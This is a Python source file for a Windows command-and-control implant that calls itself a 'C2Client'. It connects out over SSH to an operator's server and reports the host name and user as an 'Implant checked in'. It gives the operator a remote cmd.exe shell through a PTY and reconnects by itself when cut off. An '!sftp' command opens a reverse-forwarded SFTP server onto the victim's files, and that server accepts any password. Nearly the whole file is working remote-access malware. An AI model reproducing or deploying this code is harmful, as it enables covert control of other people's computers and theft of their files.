import paramiko
import subprocess
import os
import sys
import socket
import getpass
import time
import logging
import argparse
import platform
import threading
from typing import Dict, Any
import winpty

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger('C2Client')
logger = logging.getLogger('ClientSFTPServer')


# ──────────────────────────────────────────────────────────────────────────────
# 2) a trivial ServerInterface to accept the "sftp" subsystem
# ──────────────────────────────────────────────────────────────────────────────
class StubSSHServer(paramiko.ServerInterface):
    def check_channel_request(self, kind, chanid):
        if kind in ['session', 'forwarded-tcpip']:  # Accept both types
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        # authentication already done on the client→C2 leg
        return paramiko.AUTH_SUCCESSFUL

    def check_channel_subsystem_request(self, channel, name):
        if name == "sftp":
            print(name)
            logger.debug("SFTP subsystem request received and accepted")
            return True
        logger.debug(f"Subsystem request '{name}' rejected")
        return False
    
    def check_port_forward_request(self, addr: str, port: int) -> int:
        """Handle port forwarding requests from server"""
        logger.debug(f"Port forward request from server for {addr}:{port}")
        return port  # Allow forwarding by returning the port number
# ──────────────────────────────────────────────────────────────────────────────
# SFTP server implementation (only added parts)
# ──────────────────────────────────────────────────────────────────────────────
class ClientSFTPServer(paramiko.sftp_si.SFTPServerInterface):
    def __init__(self, server, *args, root=None, **kwargs):
        super().__init__(server, *args, **kwargs)

        self.root = os.path.abspath(r'C:\Users\vboxuser\Desktop\ssh_agent')
    def _to_local(self, path: str) -> str:
        safe = os.path.normpath(os.path.join(self.root, path.lstrip("/\\")))
        if not safe.startswith(self.root):
            raise IOError("Access denied")
        return safe
    def list_folder(self, path: str):
        local = self._to_local(path)
        return [ self._as_sftp_attr(os.path.join(local, f)) for f in os.listdir(local) ]
    def stat(self, path: str):
        return self._as_sftp_attr(self._to_local(path))
    def open(self, path: str, flags: int, attr):
        local = self._to_local(path)
        fd = os.open(local, flags)
        handle = paramiko.sftp_handle.SFTPHandle(flags)
        handle.fd = fd
        return handle

# dispatcher for forwarded SFTP channels
def channel_dispatcher(transport):
    while True:
        chan = transport.accept(timeout=30)
        if not chan:
            continue
        # treat forwarded channel as server-mode
        server_tr = paramiko.Transport(chan)
        server_tr.add_server_key(transport.get_remote_server_key())
        server_tr.set_subsystem_handler('sftp', paramiko.SFTPServer, ClientSFTPServer)
        server_tr.start_server(server=StubSSHServer())
        # no change to shell logic—only SFTP on these channels

# ──────────────────────────────────────────────────────────────────────────────
# original C2Client with only sftp reverse-forward added
# ──────────────────────────────────────────────────────────────────────────────
class C2Client:
    """Windows C2 Client with PTY support"""
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.ssh_client = None
        self.channel = None
        self.process = None
        self.running = True
        self.reconnect_delay = 5
        self.system_info = self._gather_system_info()

    def _gather_system_info(self) -> Dict[str, str]:
        info = {
            'hostname': socket.gethostname(),
            'username': getpass.getuser(),
            'platform': platform.system(),
            'version': platform.version(),
            'architecture': platform.machine()
        }
        return info
    
    def connect(self) -> bool:
        try:
            # Establish SSH connection as before
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            logger.debug(f"Connecting to {self.config['server_ip']}:{self.config['server_port']}")
            self.ssh_client.connect(
                self.config['server_ip'],
                port=self.config['server_port'],
                username=self.config['username'],
                password=self.config['password'],
                timeout=10
            )
            
            self.transport = self.ssh_client.get_transport()
            # Don't set up SFTP forward immediately - wait for command
                                                                
            self.channel = self.transport.open_session()
            self.channel.get_pty(term='vt100', width=80, height=24)
            self.channel.invoke_shell()
            
            if self.channel.active:
                client_info = f"Implant checked in from {self.system_info['hostname']} as {self.system_info['username']}\r\n"
                self.channel.send(client_info)
                logger.info("Successfully connected to C2 server")
                return True
            return False
        except Exception as e:
            logger.error(f"Connection error: {e}")
            return False

    def start_shell(self) -> bool:
        try:
            self.pty = winpty.PTY(cols=80, rows=24)
            proc_path = os.path.join(os.environ['SYSTEMROOT'], 'System32', 'cmd.exe')
            self.process = self.pty.spawn(proc_path)
            return True
        except Exception as e:
            logger.error(f"Error starting shell: {e}")
            return False

    def resize_pty(self, cols: int, rows: int):
        try:
            if hasattr(self, 'pty'):
                self.pty.resize(cols, rows)
        except Exception as e:
            logger.error(f"Error resizing PTY: {e}")

    def forward_io(self):
        def read_from_process():
            try:
                while self.running and self.pty and self.channel and self.channel.active:
                    data = self.pty.read()
                    if data:
                        self.channel.send(data.encode())
            except Exception as e:
                logger.error(f"Process read error: {e}")

        def read_from_channel():
            try:
                while self.running and self.channel.active:
                    if self.channel.recv_ready():
                        data = self.channel.recv(1024).decode()
                        if self.process_command(data):
                            continue 
                        if self.pty:
                            self.pty.write(data)
                    else:
                        time.sleep(0.05)
            except Exception as e:
                logger.error(f"Channel read error: {e}")
                self.running = False

        t1 = threading.Thread(target=read_from_process, name="ProcessReader")
        t2 = threading.Thread(target=read_from_channel, name="ChannelReader")
        t1.daemon = True
        t2.daemon = True
        t1.start()
        t2.start()

        while t1.is_alive() and t2.is_alive() and self.running:
            time.sleep(0.5)



    def start_sftp_server(self, port=2222):
        """Start SFTP forwarding on demand"""
        try:
            # Request port forwarding
            self.transport.request_port_forward('', port)
            
            # Set port forwarding handler
            self.transport.server_object = self  # This enables port forwarding checks
            
            # Start the dispatcher thread
            self.sftp_thread = threading.Thread(
                target=channel_dispatcher, 
                args=(self.transport,), 
                daemon=True
            )
            self.sftp_thread.start()
            self.channel.send(f"SFTP server started on port {port}\r\n")
            return True
        except Exception as e:
            logger.error(f"Error starting SFTP server: {e}")
            self.channel.send(f"Error starting SFTP server: {str(e)}\r\n")
            return False
        

    def stop_sftp_server(self, port=2222):
        """Stop SFTP forwarding"""
        try:
            self.transport.cancel_port_forward('', port)
            self.channel.send(f"SFTP server stopped on port {port}\r\n")
            return True
        except Exception as e:
            logger.error(f"Error stopping SFTP server: {e}")
            self.channel.send(f"Error stopping SFTP server: {str(e)}\r\n")
            return False
    
    def process_command(self, command):
        """Process special commands before passing to shell"""
        cmd_parts = command.strip().split()
        if not cmd_parts:
            return False
            
        # Check for special commands
        if cmd_parts[0] == "!sftp":
            if len(cmd_parts) > 1 and cmd_parts[1] == "start":
                port = int(cmd_parts[2]) if len(cmd_parts) > 2 else 2222
                return self.start_sftp_server(port)
            elif len(cmd_parts) > 1 and cmd_parts[1] == "stop":
                port = int(cmd_parts[2]) if len(cmd_parts) > 2 else 2222
                return self.stop_sftp_server(port)
            else:
                self.channel.send("Usage: !sftp [start|stop] [port]\r\n")
                return True
        return False
            
    def command_loop(self):
        while self.running:
            try:
                if not self.channel or not self.channel.active:
                    logger.info("Channel inactive, reconnecting...")
                    self.disconnect()
                    time.sleep(self.reconnect_delay)
                    if not self.connect():
                        continue

                if self.channel.recv_ready():
                    command = self.channel.recv(1024).decode().strip()
                    
                    if not self.start_shell():
                        logger.error("Failed to start shell")
                        time.sleep(self.reconnect_delay)
                        continue

                    self.forward_io()
            except Exception as e:
                logger.error(f"Command loop error: {e}")
                self.disconnect()
                time.sleep(self.reconnect_delay)


    def disconnect(self):
        try:
            if self.process: self.process.terminate()
        except: pass

    def run(self):
        try:
            if self.connect():
                self.command_loop()
        finally:
            self.disconnect()


def parse_arguments():
    parser = argparse.ArgumentParser(description="C2 Client")
    parser.add_argument("--server", default="192.168.10.135", help="C2 server address")
    parser.add_argument("--port", type=int, default=2222, help="C2 server port")
    parser.add_argument("--username", default="implant", help="Authentication username")
    parser.add_argument("--password", default="implant", help="Authentication password")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    return parser.parse_args()


def main():
    args = parse_arguments()
    if args.debug:
        logger.setLevel(logging.DEBUG)
    config = {'server_ip': args.server, 'server_port': args.port, 'username': args.username, 'password': args.password}
    C2Client(config).run()

if __name__ == '__main__':
    main()
